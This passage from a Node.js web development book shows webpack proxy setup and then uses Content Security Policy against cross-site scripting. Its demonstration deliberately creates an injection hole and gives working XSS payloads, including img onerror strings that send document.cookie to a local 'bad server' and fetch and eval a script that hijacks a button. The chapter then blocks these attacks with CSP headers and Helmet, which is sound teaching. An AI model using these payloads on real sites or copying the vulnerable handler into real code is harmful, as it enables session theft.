<figure class="mediaobject"><img alt="" src="img/B21959_07_07.png" class="calibre7"/></figure>
<p class="packt_figref">Figure 7.7: Using webpack as a proxy for the backend server</p>
<div><p class="normal"><strong class="screentext">Tip</strong></p>
<p class="normal">Behind the scenes, the webpack HTTP server uses Express and the core development server functionality is available in the <code class="inlinecode">webpack-dev-middleware</code> package, which can be used as middleware in any project that also uses Express. I have not demonstrated this feature because it requires additional packages and extensive configuration changes to recreate features like live reloading, which are already set up when using the standard webpack development server package.</p>
<p class="normal">See <a href="https://webpack.js.org/guides/development/#using-webpack-dev-middleware" class="calibre3">https://webpack.js.org/guides/development/#using-webpack-dev-middleware</a> for details of using webpack as Express middleware.</p>
</div>
<h3 class="heading2" id="_idParaDest-141">Forwarding requests from the backend server to webpack</h3>
<p class="normal1">The <a id="_idIndexMarker386" class="calibre3"/>third approach is to switch the servers around so that the backend server forwards requests to the webpack server. This has the advantage of making the development environment more consistent with production and ensures that headers set by the backend server are applied. Run the commands shown in <em class="italic">Listing 7.20</em> in the <code class="inlinecode">webapp</code> folder to install a proxy package for Express and a description of the API it provides for the TypeScript compiler. </p>
<p class="packt_figref">Listing 7.20: Installing a proxy package</p>
<pre class="programlisting1"><code class="hljs-con">npm install http-proxy@1.18.1
</code></pre>
<p class="normal"><em class="italic">Listing 7.21</em> changes the Express configuration so that requests are forwarded to the webpack server.</p>
<p class="packt_figref">Listing 7.21: Forwarding requests in the server.ts file in the src folder</p>
<pre class="programlisting"><code class="hljs-code">import { createServer } from "http";
import express, {Express } from "express";
import { readHandler } from "./readHandler";
import cors from "cors";
<strong class="screentext">import httpProxy from "http-proxy";</strong>
const port = 5000;
const expressApp: Express = express();
<strong class="screentext">const proxy = httpProxy.createProxyServer({</strong>
<strong class="screentext">    target: "http://localhost:5100", ws: true</strong>
<strong class="screentext">});</strong>
expressApp.use(cors({
    origin: "http://localhost:5100"
}));
expressApp.use(express.json());
expressApp.post("/read", readHandler);
expressApp.use(express.static("static"));
expressApp.use(express.static("node_modules/bootstrap/dist"));
<strong class="screentext">//expressApp.use(express.static("dist/client"));</strong>
<strong class="screentext">expressApp.use((req, resp) =&gt; proxy.web(req, resp));</strong>
const server = createServer(expressApp);
<strong class="screentext">server.on('upgrade', (req, socket, head) =&gt; proxy.ws(req, socket, head));</strong>
server.listen(port,
    () =&gt; console.log(`HTTP Server listening on port ${port}`));
</code></pre>
<p class="normal">The<a id="_idIndexMarker387" class="calibre3"/> changes enable the proxy, including support for dealing with web socket requests, which are used for the live reload feature, and which must also be forwarded to the webpack development server. A corresponding update is required in the webpack configuration file to specify the URL that the client-side live reloading code will connect to, as shown in <em class="italic">Listing 7.22</em>.</p>
<p class="packt_figref">Listing 7.22: Changing the client-side URL in the webpack.config.mjs file</p>
<pre class="programlisting"><code class="hljs-code">import path from "path";
import { fileURLToPath } from 'url';
const __dirname = path.dirname(fileURLToPath(import.meta.url));
export default  {
    mode: "development",
    entry: "./static/client.js",
    output: {
        path: path.resolve(__dirname, "dist/client"),
        filename: "bundle.js"
    },
    "devServer": {
        port: 5100,
        static: ["./static", "node_modules/bootstrap/dist"],
        <strong class="screentext">// proxy: {</strong>
<strong class="screentext">        //     "/read": "http://localhost:5000"</strong>
<strong class="screentext">        // },</strong>
<strong class="screentext">        client: {</strong>
<strong class="screentext">            webSocketURL</strong><strong class="screentext">: "http://localhost:5000/ws"</strong>
<strong class="screentext">        }</strong>
    }
};
</code></pre>
<p class="normal">Use <em class="italic">Control+C</em> to stop the existing build process and run <code class="inlinecode">npm start</code> in the <code class="inlinecode">webapp</code> folder so <a id="_idIndexMarker388" class="calibre3"/>that the changes take effect. Use a browser to request <code class="inlinecode">http://localhost:5000</code>, as shown in <em class="italic">Figure 7.8</em>, to have the backend server receive the request and still benefit from the features of the webpack development server.</p>
<figure class="mediaobject"><img alt="" src="img/B21959_07_08.png" class="calibre7"/></figure>
<p class="packt_figref">Figure 7.8: Using the backend server as a proxy for webpack</p>
<h1 class="heading" id="_idParaDest-142">Using a content security policy</h1>
<p class="normal1">CORS is an<a id="_idIndexMarker389" class="calibre3"/> example of a set of request headers that were introduced to address malicious behavior by providing the browser with information about how the application is expected to work. </p>
<p class="normal">There are <a id="_idIndexMarker390" class="calibre3"/>additional headers that the backend server can set to provide the browser with insight into how the application works and what behaviors are expected. The most important header is <code class="inlinecode">Content-Security-Policy</code>, which the backend server uses to describe the application’s <strong class="screentext">Content Security Policy</strong> (<strong class="screentext">CSP</strong>). The CSP tells the browser what behaviors to expect from the client-side application so that the browser can block suspicious activity.</p>
<p class="normal">The use of content security policies is intended to prevent <strong class="screentext">cross-site scripting</strong> (<strong class="screentext">XSS</strong>) attacks. There are many variations of XSS attacks, but they all involve injecting malicious content or code into the content displayed by the browser to perform a task not intended by the application developers – typically something that deceives the user or steals sensitive data.</p>
<p class="normal">One common cause of XSS attacks arises when an application accepts input from one user that is subsequently incorporated into the content presented to other users. If an application accepts user reviews that are displayed alongside products, for example, an attacker could craft a review that browsers will interpret as HTML or JavaScript content when the product page is displayed.</p>
<p class="normal">The best place to start is with a demonstration of the problem, which requires some changes to the example application. The first change is to add an <code class="inlinecode">input</code> element to the HTML document displayed by the browser, which will allow the user to enter data that will later be displayed by the browser, as shown in <em class="italic">Listing 7.23</em>.</p>
<p class="packt_figref">Listing 7.23: Adding an input element in the index.html file in the static folder</p>
<pre class="programlisting"><code class="hljs-code">&lt;!DOCTYPE html&gt;
&lt;html&gt;
    &lt;head&gt;
        &lt;script src="img/bundle.js"&gt;&lt;/script&gt;
        &lt;link href="css/bootstrap.min.css" rel="stylesheet" /&gt;
    &lt;/head&gt;
    &lt;body&gt;
       <strong class="screentext"> &lt;div class="m-2"&gt;</strong>
<strong class="screentext">            &lt;</strong><strong class="screentext">label class="form-label"&gt;Message:&lt;/label&gt;</strong>
<strong class="screentext">            &lt;input id="input" class="</strong><strong class="screentext">form-control" /&gt;</strong>
<strong class="screentext">        &lt;/div&gt;</strong>
        &lt;button id="btn" class="btn btn-primary m-2"&gt;Send Message&lt;/button&gt;
        &lt;table class="table table-striped"&gt;
            &lt;tbody&gt;
                &lt;tr&gt;&lt;th&gt;Status&lt;/th&gt;&lt;td id="msg"&gt;&lt;/td&gt;&lt;/tr&gt;
                &lt;tr&gt;&lt;th&gt;Response&lt;/th&gt;&lt;td id="body"&gt;&lt;/td&gt;&lt;/tr&gt;
            &lt;/tbody&gt;
       &lt;/table&gt;
    &lt;/body&gt;
&lt;/html&gt;
</code></pre>
<p class="normal"><em class="italic">Listing 7.24</em> updates <a id="_idIndexMarker391" class="calibre3"/>the client-side JavaScript code so that it sends the contents of the <code class="inlinecode">input</code> element added in <em class="italic">Listing 7.23</em> to the server.</p>
<p class="packt_figref">Listing 7.24: Updating the client-side code in the client.js file in the static folder</p>
<pre class="programlisting"><code class="hljs-code">document.addEventListener('DOMContentLoaded', function() {
    document.getElementById("btn").addEventListener("click", sendReq);
});
const requestUrl = "/read";
sendReq = async () =&gt; {
    <strong class="screentext">// let payload = document.getElementById("input").value;</strong>
<strong class="screentext">    // for (let i = 0; i &lt; 5; i++) {</strong>
<strong class="screentext">    //     payload.push({ id: i, message: `Payload Message: ${i}\n`});</strong>
<strong class="screentext">    // }</strong>
    const response = await fetch(requestUrl, {
       <strong class="screentext"> method: "POST", body</strong><strong class="screentext">: document.getElementById("input").value,</strong>
<strong class="screentext">  // headers: {</strong>
<strong class="screentext">        //     "Content-Type": "application/json"</strong>
<strong class="screentext">        // }</strong>
    })
    document.getElementById("msg").textContent = response.statusText;
    document.getElementById("body").innerHTML = await response.text();
}
</code></pre>
<p class="normal"><em class="italic">Listing 7.25</em> updates <a id="_idIndexMarker392" class="calibre3"/>the handler that receives data from the browser so that it pipes the data from the request to the response. This means that whatever is entered into the <code class="inlinecode">input</code> element will be sent to the server and then piped back to the browser, where it will be displayed to the user.</p>
<p class="packt_figref">Listing 7.25: Piping data in the readHandler.ts file in the src folder</p>
<pre class="programlisting"><code class="hljs-code">import { Request, Response } from "express";
export const readHandler = (req: Request, resp: Response) =&gt; {   
    <strong class="screentext">// resp.json({</strong>
<strong class="screentext">    //     message: "Hello, World"</strong>
<strong class="screentext">    // });</strong>
<strong class="screentext">    resp.cookie("sessionID", "mysecretcode");</strong>
<strong class="screentext">    req.pipe(resp);</strong>
}
</code></pre>
<p class="normal">The handler also sets a cookie in the response. One of the uses of XSS attacks is to steal session credentials so that the attacker can impersonate a legitimate user. The cookie set by the code in <em class="italic">Listing 7.25</em> is a placeholder for data that will be stolen.</p>
<div><p class="normal"><strong class="screentext">Tip</strong></p>
<p class="normal">See Part 2 of this book for details on how to create and use real sessions.</p>
</div>
<p class="normal">The changes from <em class="italic">Listing 7.23</em> to <em class="italic">Listing 7.25</em> deliberately create a situation where input provided by the user is used without any form of validation. This sort of problem is easy to spot in a simple example but can be much more difficult to identify in a real project, especially one where features are added over time. This is such a common problem that XSS is one of the top 10 application security risks identified by the <strong class="screentext">Open Worldwide Application Security Project</strong> (<strong class="screentext">OWASP</strong>) and <a id="_idIndexMarker393" class="calibre3"/>has been for some years (see <a href="https://owasp.org/www-project-top-ten" class="calibre3">https://owasp.org/www-project-top-ten</a> for the complete list).</p>
<h2 class="heading1" id="_idParaDest-143">Injecting malicious content</h2>
<p class="normal1">To <a id="_idIndexMarker394" class="calibre3"/>complete the preparations, add a file named <code class="inlinecode">badServer.mjs</code> to the <code class="inlinecode">webapp</code> folder with the content shown in <em class="italic">Listing 7.26</em>. This is a “bad” server, which will serve content and receive requests on behalf of malicious code.</p>
<p class="packt_figref">Listing 7.26: Creating a server in the badServer.mjs file in the webapp folder</p>
<pre class="programlisting"><code class="hljs-code">import { createServer } from "http";
import express from "express";
import cors from "cors";
createServer(express().use(cors()).use(express.static("static"))
    .post("*", (req, resp) =&gt; {
        req.on("data", (data) =&gt; { console.log(data.toString()) });
        req.on("end", () =&gt; resp.end());
    })).listen(9999,
        () =&gt; console.log(`Bad Server listening on port 9999`));
</code></pre>
<p class="normal">For the sake of simplicity, this file contains JavaScript code so that it can be executed without needing the TypeScript compiler. The code is expressed for brevity, rather than readability, and uses the Express features for serving static content and the router to receive POST requests.</p>
<p class="normal">Open a new command prompt, navigate to the <code class="inlinecode">webapp</code> folder, and run the command shown in <em class="italic">Listing 7.27</em> to start the server.</p>
<p class="packt_figref">Listing 7.27: Starting the bad web server</p>
<pre class="programlisting1"><code class="hljs-con">node badServer.mjs
</code></pre>
<p class="normal">Having prepared the example application and the bad server, the process of subverting the application requires entering carefully crafted strings, intended to get the browser to load content or execute JavaScript that isn’t part of the application.</p>
<div><p class="normal"><strong class="screentext">Note</strong></p>
<p class="normal">This section shows simple – and related – exploits that take advantage of a defect that I have knowingly created, which helps me describe useful features but doesn’t cover the full spectrum of XSS issues. You can find an excellent set of XSS tests to apply at <a href="https://cheatsheetseries.owasp.org/cheatsheets/XSS_Filter_Evasion_Cheat_Sheet.html" class="calibre3">https://cheatsheetseries.owasp.org/cheatsheets/XSS_Filter_Evasion_Cheat_Sheet.html</a>.</p>
</div>
<p class="normal">Enter the<a id="_idIndexMarker395" class="calibre3"/> text shown in <em class="italic">Listing 7.28</em> into the <code class="inlinecode">input</code> element and click the <strong class="screentext">Send Message</strong> button. Pay close attention to the quote characters when entering the text into the <code class="inlinecode">input</code> element. It is important to use double and single quotes as they are shown, otherwise, the browser won’t be able to parse the string.</p>
<p class="packt_figref">Listing 7.28: Requesting an image</p>
<pre class="programlisting"><code class="hljs-code">&lt;img src="img/city.png" onclick="location='http://packt.com'"&gt;
</code></pre>
<p class="normal">The client-side JavaScript code adds the response from the server to the HTML document displayed to the user, which causes the browser to request an image file from the bad server. Clicking on the image causes the browser to navigate away from the application, as shown in <em class="italic">Figure 7.9</em>.</p>
<figure class="mediaobject"><img alt="" src="img/B21959_07_09.png" class="calibre7"/></figure>
<p class="packt_figref">Figure 7.9: Loading an image with a click redirection</p>
<p class="normal">It isn’t just <a id="_idIndexMarker396" class="calibre3"/>images that can be added to the document. Enter the text shown in <em class="italic">Listing 7.29</em> into the <code class="inlinecode">input</code> element and click the <strong class="screentext">Send Message</strong> button, which will add a button to the document displayed by the user. Once again, pay close attention to the quote characters.</p>
<p class="packt_figref">Listing 7.29: Creating a button</p>
<pre class="programlisting"><code class="hljs-code">&lt;button class="btn btn-danger" onclick="location='http://packt.com'"&gt;Click&lt;/button&gt;
</code></pre>
<p class="normal">The button that is created takes advantage of the CSS stylesheets that are used by the application, giving the new element an appearance that is consistent with the other button displayed by the browser, as shown in <em class="italic">Figure 7.11</em>.</p>
<figure class="mediaobject"><img alt="" src="img/B21959_07_10.png" class="calibre7"/></figure>
<p class="packt_figref">Figure 7.11: Adding an element</p>
<p class="normal">Injected <a id="_idIndexMarker397" class="calibre3"/>code can also be used to steal sensitive data. Enter the text shown in <em class="italic">Listing 7.30</em> into the <code class="inlinecode">input</code> element and click the <strong class="screentext">Send Message</strong> button, once again paying close attention to the quote characters and entering the text as a single line.</p>
<p class="packt_figref">Listing 7.30: Stealing data</p>
<pre class="programlisting"><code class="hljs-code">&lt;img src="img/nope" onerror="fetch('http://localhost:9999', { method: 'POST', body: document.cookie})"&gt;
</code></pre>
<p class="normal">This <code class="inlinecode">img</code> element specifies a file that doesn’t exist. The browser will emit the <code class="inlinecode">error</code> event when it fails to load the file, which executes the fragment of JavaScript code assigned to the <code class="inlinecode">onerror</code> attribute in <em class="italic">Listing 7.30</em>. The code uses the browser’s Fetch API to send an HTTP POST request to the bad server, including the sensitive cookie data as the request body. If you examine the output from the command prompt running the bad server, you will see the following message, showing the data that the bad server received:</p>
<pre class="programlisting1"><code class="hljs-con">Bad Server listening on port 9999
<strong class="screentext">sessionID=mysecretcode</strong>
</code></pre>
<p class="normal">No user <a id="_idIndexMarker398" class="calibre3"/>action was needed to trigger this behavior and the data is sent as soon as the browser tries – and fails – to load the image. For the final example, add a file named <code class="inlinecode">bad.js</code> to the <code class="inlinecode">static</code> folder with the content shown in <em class="italic">Listing 7.31</em>.</p>
<p class="packt_figref">Listing 7.31: The contents of the bad.js file in the static folder</p>
<pre class="programlisting"><code class="hljs-code">const input = document.getElementById("input");
const button = document.getElementById("btn");
const newButton = button.cloneNode();
button.parentElement.replaceChild(newButton, button);
newButton.textContent = "Bad Button";
newButton.addEventListener("click", () =&gt; {
    sendReq();
    fetch("http://localhost:9999", {
        method: "POST",
        body: JSON.stringify({
            cookie: document.cookie,
            input: input.value
        })
    });
});
input.value = "";
input.placeholder = "Enter something secret here";
document.getElementById("body").innerHTML = "";
</code></pre>
<p class="normal">This code locates the <code class="inlinecode">button</code> element in the HTML document and replaces it with one that sends the sensitive data to the bad server. To get the browser to load this file, enter the text shown in <em class="italic">Listing 7.32</em> in the <code class="inlinecode">input</code> element and click the <strong class="screentext">Send Message</strong> button. This is the most complex example in this section and particular care must be taken to enter it correctly and as a single line.</p>
<p class="packt_figref">Listing 7.32: Loading a JavaScript file</p>
<pre class="programlisting"><code class="hljs-code">&lt;img src="img/nope" onerror="fetch('http://localhost:9999/bad.js').then(r =&gt; r.text()).then(t =&gt; eval(t))"&gt;
</code></pre>
<p class="normal">The JavaScript code uses the browser’s Fetch API to request the <code class="inlinecode">bad.js</code> file from the bad <a id="_idIndexMarker399" class="calibre3"/>HTTP server and then uses the JavaScript <code class="inlinecode">eval</code> function to execute its contents. The <code class="inlinecode">eval</code> function will treat any string as JavaScript code and, as a consequence, can present a risk whenever it is used. When the browser executes the JavaScript code, the existing button is replaced with one that sends the sensitive cookie data to the bad server, as shown in <em class="italic">Figure 7.12</em>. (The button text is also changed just to emphasize the change.)</p>
<figure class="mediaobject"><img alt="" src="img/B21959_07_11.png" class="calibre7"/></figure>
<p class="packt_figref">Figure 7.12: Replacing a button</p>
<p class="normal">When you click the button, the bad HTTP server will display a console message that shows the cookie value and whatever you entered into the <code class="inlinecode">input</code> element before clicking the button, like this:</p>
<pre class="programlisting"><code class="hljs-code">...
{"cookie":"sessionID=mysecretcode","input":"myothersecret"}
...
</code></pre>
<div><p class="normal"><strong class="screentext">Why Not Just inject a script element?</strong></p>
<p class="normal">XSS attacks have been such a problem for so long that some protections against them are codified into the HTML specification. For example, the client-side code in the example application uses the <code class="inlinecode">innerHTML</code> property to display the response it receives from the backend server, like this:</p>
<pre class="programlisting2"><code class="hljs-code"><code class="inlinecode2">...</code>
<code class="inlinecode2">document.getElementById("body").innerHTML = await response.text();</code>
<code class="inlinecode2">...</code>
</code></pre>
<p class="normal">The HTML specification instructs browsers not to execute <code class="inlinecode">script</code> elements assigned to the <code class="inlinecode">innerHTML</code> property, which means that using JavaScript code directly won’t work, but using event handlers will. This limitation arises because of the way the example app has evolved from chapter to chapter, and you must not assume that all applications will be similarly restricted.</p>
</div>
<h2 class="heading1" id="_idParaDest-144">Defining a content security policy</h2>
<p class="normal1">A <a id="_idIndexMarker400" class="calibre3"/>content security policy tells the browser how the client-side application is expected to behave and is set using the <code class="inlinecode">Content-Security-Policy</code> header, as shown in <em class="italic">Listing 7.33</em>. </p>
<p class="packt_figref">Listing 7.33: Setting a content security policy in the server.ts file in the src folder</p>
<pre class="programlisting"><code class="hljs-code">import { createServer } from "http";
import express, {Express } from "express";
import { readHandler } from "./readHandler";
import cors from "cors";
import httpProxy from "http-proxy";
const port = 5000;
const expressApp: Express = express();
const proxy = httpProxy.createProxyServer({
    target: "http://localhost:5100", ws: true
});
<strong class="screentext">expressApp.use((</strong><strong class="screentext">req, resp, next) =&gt; {</strong>
<strong class="screentext">    resp.setHeader("Content-Security-Policy", "img-src 'self'");</strong>
<strong class="screentext">    next();</strong>
<strong class="screentext">})</strong>
expressApp.use(cors({
    origin: "http://localhost:5100"
}));
expressApp.use(express.json());
expressApp.post("/read", readHandler);
expressApp.use(express.static("static"));
expressApp.use(express.static("node_modules/bootstrap/dist"));
//expressApp.use(express.static("dist/client"));
expressApp.use((req, resp) =&gt; proxy.web(req, resp));
const server = createServer(expressApp);
server.on('upgrade', (req, socket, head) =&gt; proxy.ws(req, socket, head));
server.listen(port,
    () =&gt; console.log(`HTTP Server listening on port ${port}`));
</code></pre>
<p class="normal">The <a id="_idIndexMarker401" class="calibre3"/>CSP header should be applied to every response, and so the listing uses the Express <code class="inlinecode">use</code> method to set up a middleware component, which is like a regular request handler but receives an additional argument that is used to pass the request along for further processing.</p>
<p class="normal">The header value is the policy for the application and consists of one or more <em class="italic">policy directives</em> and values. The header in <em class="italic">Listing 7.33</em> contains one policy directive, which is <code class="inlinecode">img-src</code> and whose value is <code class="inlinecode">self</code>:</p>
<pre class="programlisting"><code class="hljs-code">...
resp.setHeader("Content-Security-Policy", <strong class="screentext">"img-src 'self'"</strong>);
...
</code></pre>
<p class="normal">The CSP specification defines a range of policies that specify the locations from which different content can be loaded. <em class="italic">Table 7.4</em> describes the most useful policy directives, and a full list can be found at <code class="inlinecode">https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/Content-Security-Policy</code>. </p>
<p class="packt_figref">Table 7.4: Useful CSP directives</p>
<table class="table-container" id="table004-3">
<tbody class="calibre8">
<tr class="calibre9">
<td class="table-cell">
<p class="normal">Policy Directive</p>
</td>
<td class="table-cell">
<p class="normal">Description</p>
</td>
</tr>
<tr class="calibre9">
<td class="table-cell">
<pre class="programlisting2"><code class="hljs"><code class="inlinecode1">default-src</code>
</code></pre>
</td>
<td class="table-cell">
<p class="normal">This directive sets the default policy for all directives.</p>
</td>
</tr>
<tr class="calibre9">
<td class="table-cell">
<pre class="programlisting2"><code class="hljs"><code class="inlinecode1">connect-src</code>
</code></pre>
</td>
<td class="table-cell">
<p class="normal">This directive specifies the URLs that can be requested using JavaScript code.</p>
</td>
</tr>
<tr class="calibre9">
<td class="table-cell">
<pre class="programlisting2"><code class="hljs"><code class="inlinecode1">img-src</code>
</code></pre>
</td>
<td class="table-cell">
<p class="normal">This directive specifies the sources from which images can be loaded.</p>
</td>
</tr>
<tr class="calibre9">
<td class="table-cell">
<pre class="programlisting2"><code class="hljs"><code class="inlinecode1">script-src</code>
</code></pre>
</td>
<td class="table-cell">
<p class="normal">This directive specifies the sources from which JavaScript files can be loaded.</p>
</td>
</tr>
<tr class="calibre9">
<td class="table-cell">
<pre class="programlisting2"><code class="hljs"><code class="inlinecode1">script-src-attr</code>
</code></pre>
</td>
<td class="table-cell">
<p class="normal">This directive specifies the valid sources for inline event handlers.</p>
</td>
</tr>
<tr class="calibre9">
<td class="table-cell">
<pre class="programlisting2"><code class="hljs"><code class="inlinecode1">form-action</code>
</code></pre>
</td>
<td class="table-cell">
<p class="normal">This directive specifies the URLs to which form data can be sent.</p>
</td>
</tr>
</tbody>
</table>
<p class="normal">The values<a id="_idIndexMarker402" class="calibre3"/> for a policy can be specified using URLs with wildcards (such as <code class="inlinecode">http://*.acme.com</code>) or a scheme (such as <code class="inlinecode">http:</code> to allow all HTTP requests or <code class="inlinecode">https:</code> for all HTTPS requests). There are also special values such as <code class="inlinecode">'none'</code>, which blocks all URLs, and <code class="inlinecode">'self'</code>, which limits requests to the origin from which the document was loaded. (The single quotes must be specified for these special values, which is why the policy defined in <em class="italic">Listing 7.33</em> looks oddly quoted.)</p>
<p class="normal">The policy defined in <em class="italic">Listing 7.33</em> tells the browser that images can only be requested from the same origin as the HTML document. To see the effect, reload the browser, enter the text from <em class="italic">Listing 7.28</em>, and click the <strong class="screentext">Send Message</strong> button. (You must reload to ensure that the header defined in <em class="italic">Listing 7.33</em> is sent to the browser.)</p>
<p class="normal">The policy restricts images so they can only come from the same origin as the HTML document. If you examine the browser’s <em class="italic">F12</em> developer tools, you will see an error message in the console similar to this one, which is from Chrome:</p>
<pre class="programlisting1"><code class="hljs-con">...
Refused to load the image 'http://localhost:9999/city.png' because it violates the following Content Security Policy directive: "img-src 'self'".
...
</code></pre>
<p class="normal">The attempt <a id="_idIndexMarker403" class="calibre3"/>to load an image from the bad server was prevented, but if you click the broken image placeholder displayed by the browser, you will still be able to navigate away from the application. Policies generally require multiple directives to be effective.</p>
<h2 class="heading1" id="_idParaDest-145">Using a package to set the policy header</h2>
<p class="normal1">It is possible to set <a id="_idIndexMarker404" class="calibre3"/>the CSP header directly, as the previous section demonstrated, but using a package to define a CSP policy is easier and less prone to errors. One excellent package is <em class="italic">Helmet</em> (<a href="https://helmetjs.github.io" class="calibre3">https://helmetjs.github.io</a>), which sets several security-related headers, including the CSP header. Run the command shown in <em class="italic">Listing 7.34</em> in the <code class="inlinecode">webapp</code> folder to install the Helmet package. </p>
<p class="packt_figref">Listing 7.34: Adding a package to the project</p>
<pre class="programlisting1"><code class="hljs-con">npm install helmet@7.1.0
</code></pre>
<p class="normal"><em class="italic">Listing 7.35</em> replaces the custom middleware from the previous section with the equivalent functionality provided by Helmet and defines the complete policy for the example application.</p>
<p class="packt_figref">Listing 7.35: Defining a CSP policy in the server.ts file in the src folder</p>
<pre class="programlisting"><code class="hljs-code">import { createServer } from "http";
import express, {Express } from "express";
import { readHandler } from "./readHandler";
import cors from "cors";
import httpProxy from "http-proxy";
<strong class="screentext">import helmet from "helmet";</strong>
const port = 5000;
const expressApp: Express = express();
const proxy = httpProxy.createProxyServer({
    target: "http://localhost:5100", ws: true
});
<strong class="screentext">// expressApp.use((req, resp, next) =&gt; {</strong>
<strong class="screentext">//     resp.setHeader("Content-Security-Policy",</strong>
<strong class="screentext">//       "img-src 'self'; connect-src 'self'");</strong>
<strong class="screentext">//     next();</strong>
<strong class="screentext">// })</strong>
<strong class="screentext">expressApp.use(helmet({</strong>
<strong class="screentext">    contentSecurityPolicy: {</strong>
<strong class="screentext">        directives: {</strong>
<strong class="screentext">            imgSrc: "'self'",</strong>
<strong class="screentext">            scriptSrcAttr: "'none'",</strong>
<strong class="screentext">            scriptSrc: "'</strong><strong class="screentext">self'",</strong>
<strong class="screentext">            connectSrc: "'self' ws://localhost:5000"           </strong>
<strong class="screentext">        }</strong>
<strong class="screentext">    }</strong>
<strong class="screentext">}));</strong>
expressApp.use(cors({
    origin: "http://localhost:5100"
}));
expressApp.use(express.json());
expressApp.post("/read", readHandler);
expressApp.use(express.static("static"));
expressApp.use(express.static("node_modules/bootstrap/dist"));
expressApp.use((req, resp) =&gt; proxy.web(req, resp));
const server = createServer(expressApp);
server.on('upgrade', (req, socket, head) =&gt; proxy.ws(req, socket, head));
server.listen(port,
    () =&gt; console.log(`HTTP Server listening on port ${port}`));
</code></pre>
<p class="normal">Helmet is applied as middleware and is configured with an object whose properties determine the headers that are set and the values that should be used. The <code class="inlinecode">contentSecurityPolicy.directives</code> property is used to set CSP directives, expressed as camel case because the hyphenated CSP directive names are not allowed in JavaScript (so <code class="inlinecode">img-src</code> becomes <code class="inlinecode">imgSrc</code>, for example).</p>
<p class="normal">The <a id="_idIndexMarker405" class="calibre3"/>configuration in <em class="italic">Listing 7.35</em> specifies a content security policy that will allow images to be loaded from the HTML document’s domain, block all JavaScript in element attributes, restrict JavaScript files to the document’s domain, and limit the URLs to which connections can be made by JavaScript code.</p>
<p class="normal">This last directive specifies <code class="inlinecode">self</code>, allowing HTTP connections to be sent to the backend server, but also includes the <code class="inlinecode">ws://localhost:5000</code> URL, which allows the connection required by the webpack live reload feature (the <code class="inlinecode">ws</code> scheme denotes a web sockets connection and is the same connection that required additional configuration when setting up the proxy in <em class="italic">Listing 7.21</em>). </p>
<p class="normal">If you reload the browser at this point, you will see a CSP error displayed in the browser’s JavaScript console. That’s because the CSP has disabled the use of the <code class="inlinecode">eval</code> function, which is sensible because it is so dangerous, but problematic because webpack unpacks the contents of its bundles using <code class="inlinecode">eval</code>. (This is only the case when webpack is producing development bundles and is not the case when the final bundles are produced before an application is deployed.)</p>
<p class="normal">The best approach is to change the webpack configuration so that it uses a different technique to process bundles, as shown in <em class="italic">Listing 7.36</em>.</p>
<p class="packt_figref">Listing 7.36: Changing the webpack configuration in the webpack.config.mjs file in the webapp folder</p>
<pre class="programlisting"><code class="hljs-code">import path from "path";
import { fileURLToPath } from 'url';
const __dirname = path.dirname(fileURLToPath(import.meta.url));
export default  {
    mode: "development",
    entry: "./static/client.js",
    output: {
        path: path.resolve(__dirname, "dist/client"),
        filename: "bundle.js"
    },
    "devServer": {
        port: 5100,
        static: ["./static", "node_modules/bootstrap/dist"],
        client: {
            webSocketURL: "http://localhost:5000/ws"
        }
    },
   <strong class="screentext"> </strong><strong class="screentext">devtool: "source-map"</strong>
};
</code></pre>
<p class="normal">Use <em class="italic">Control+C</em> to stop the build tools and run the <code class="inlinecode">npm start</code> command in the <code class="inlinecode">webapp</code> folder to<a id="_idIndexMarker406" class="calibre3"/> start them again with the new configuration. Reload the browser and the JavaScript bundle will be processed without using the <code class="inlinecode">eval</code> function. Run through the examples in <em class="italic">Listing 7.28</em> to <em class="italic">Listing 7.32</em> again and you will see that each attack is defeated by one of the content security settings.</p>
<div><p class="normal"><strong class="screentext">Note</strong></p>
<p class="normal">The <code class="inlinecode">Content-Security-Policy-Report-Only</code> header instructs the browser to report on actions that would break the content security policy without blocking those actions, which can be a good way to assess an existing application. If you are using the Helmet package, you can enable this header by setting the <code class="inlinecode">contentSecurityPolicy.reportOnly</code> configuration setting to <code class="inlinecode">true</code>. </p>
</div>
<p class="normal">There are limits to CSP and it is important to avoid including unfiltered user input in the HTML displayed to the user. I demonstrate how user input can be processed in Part 2 of this book.</p>
<div><p class="normal"><strong class="screentext">Note</strong></p>
<p class="normal">If you are unable to alter the webpack configuration, then you can allow the <code class="inlinecode">eval</code> function in the content security policy. Use <code class="inlinecode">"'self' 'unsafe-eval'"</code> as the value for the <code class="inlinecode">scriptSrc</code> setting. The special <code class="inlinecode">'unsafe-eval'</code> value allows the eval function to be used, but the <code class="inlinecode">'self'</code> value restricts the locations from which JavaScript files can be downloaded to just the backend server.</p>
</div>
<h1 class="heading" id="_idParaDest-146">Summary</h1>
<p class="normal1">In this chapter, I described two important ways in which the backend Node.js server works with the other components in a modern web application. The first topic I described was the use of a bundler:</p>
<ul class="calibre4">
<li class="bulletlist">Bundlers combine and compress multiple files to reduce the number of HTTP requests made by the browser and reduce the amount of data to be transferred.</li>
<li class="bulletlist1">Bundlers are integrated into the developer tools for all of the popular client-side frameworks, including Angular and React.</li>
<li class="bulletlist1">Bundlers can work independently of the backend server, but the best workflows are achieved by using them together.</li>
<li class="bulletlist1">The second topic I described was the application of a content security policy.</li>
<li class="bulletlist1">Content security policies are used to defend against <strong class="screentext">cross-site scripting</strong> (<strong class="screentext">XSS</strong>) attacks, in which the goal is to trick the browser into executing malicious JavaScript code.</li>
<li class="bulletlist1">To apply a content security policy, the backend server provides the browser with a description of how the client-side application code behaves in terms of how it obtains and uses resources such as images and JavaScript code.</li>
<li class="bulletlist1">The browser blocks JavaScript operations that are outside of the limits imposed by the content security policy.</li>
</ul>
<p class="normal">In the next chapter, I will demonstrate the features that Node.js provides for unit testing and debugging JavaScript code.</p>
</div>
</body></html>